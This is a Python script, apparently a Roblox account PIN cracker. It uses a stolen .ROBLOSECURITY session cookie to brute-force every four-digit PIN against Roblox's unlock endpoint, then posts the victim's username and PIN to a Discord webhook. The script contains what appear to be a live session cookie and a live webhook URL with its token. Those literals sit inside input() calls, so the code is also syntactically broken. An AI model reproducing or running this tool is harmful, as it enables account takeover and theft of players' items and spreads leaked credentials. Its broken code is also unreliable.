import requests
import re
import string
import time
import os

pingEveryone = True
print('')
print('Enter your cookie below:')
cookie = input(_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_F1A5AB022372A94AACEC8A05A74DFE9ADDE3167D4F5DCED559A916E988BA3419FD9E2E59F6D5ABD44C3C83B5FCF58BD616F3E6B68020CA0E415B45106991E12625E8623ADBF8DE8B41F31CC0DB2921B3A089A0BD4E0F659C5C68CFCEB77B2208C8B27F5AE0ABA842D1F243EAA22BFC551CB46623A9A41207CFA7FFB49B9CB0141EBA32B35401A39D77DB8DCBC1837DC8B4572998149B0BEDED4A7F92D29DAC2B7AA7AAF91A36EF5064EE58A135DE14DF2BDAE17FE030B3A8416C6A3C3CD269F9D366E2E9BD16599D6D8319CADED846988A3096156839D85E2535D0E7FE4C648A66549B9BFBA38770456CC3E08C26120D3AC1DF5C5B13F5A553A0F5D6E39DACCD455B1B81FC662954E55CD09CDCFF93B8FBBD01034F48DF7ECE0C371EFBD5A9A84CF7364D74FD5B72E2F7A9900CE4C22D79B3C3A4697EDF8E3EC9E4DCA984562CC59AF77D82B59CC60C8F85F5D3F1B6EC59F2E8E0B55AC7ECCB4F18D3721578F5839358EEBCAF6CB3801015C2128CB12DE7C07AED0013E175DAB98C10CB51556EF740908E323B04FD77DBFC215C9EC34C1AAC18FEBCFCCE10CBE4B1394F41892B1DEE9610FAFE476DCA3C94B4F40DE251B5EDA8BDCE8AA2B36A4EC369ACC5628B9DC1B26D81190A247D04A63842B5418263670C31930D92FDEA595473B5F0D4B062EC1593C0273DA90BC710DE651CDB41D34A0AD6E15530B9CAB03D474DF73DD1FF9BF8711BB042A9E1A2DDC94AF323A85367DCE27AEE92E51B760B9EC9459C3F6310D199DF6170287BA7FA588C0CE099BA7DD5F6FD1DA5670D8C6E15520972E44F706119FCF585C8420CC2E97EE5A67A49DD92EFF360C23FD10025A8FABDC08DF85D8FFB2D9293859D5697F2D44275AB591DFE40376F931FF94D144FD4140AB20A9A1EC031F98DB0896FDCD8701174AAFA4C6362BE411C925F7A604116469A8831B7A60DC6A0DA8BC88E80402783FE9263C809882D6A96E982C5EB7C354CB35D916FB984AFAEFB2956A619BC6A63175106C2CD30B3A773E8E8C2CCCE53D3A2EB6F870DC6DAB5FC07BD885E4B2F297A04A074D1FB59C49E0BC46D96E589412FE2A8C622F9A5DC7A14E7C83B69399D0E680B8332778DB1F16D02E6EF5C1EA88DA1B2AE59D0)
os.system("cls")
print('')
print('Enter your webhook below:')
webhook = input(https://discord.com/api/webhooks/1292466053611257880/f4pi8nrGZlZOw4oAf5YXUhS6HLKvzgNNhj68n6qW3RQdaffqz5sXSmDDuvAylTUYijjY)
os.system("cls")
print('')
print('Should we ping Everyone?: ( y / n )')
pingEveryone = input(y)
os.system("cls")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pin Cracked! Join Our Discord : https://discord.gg/kunai***'
os.system("cls")

print('''Cracker Has Started.''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "kunai;",
                "avatar_url" : "https://cdn.discordapp.com/attachments/930056703930671164/930057430270881812/Tanqr_gfx.png"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : "Cracked Pin!",
                    "color" : 0x00ffff,
                }
            ]

            result = requests.post(webhook, json = data)
            input('Press any key to exit')
            break
            
        elif 'Too many requests made' in r.text:
                
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('  Error! Is the cookie valid?')
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)  
    except:
        print('  Error!')
    
input('\n  Press any key to exit')
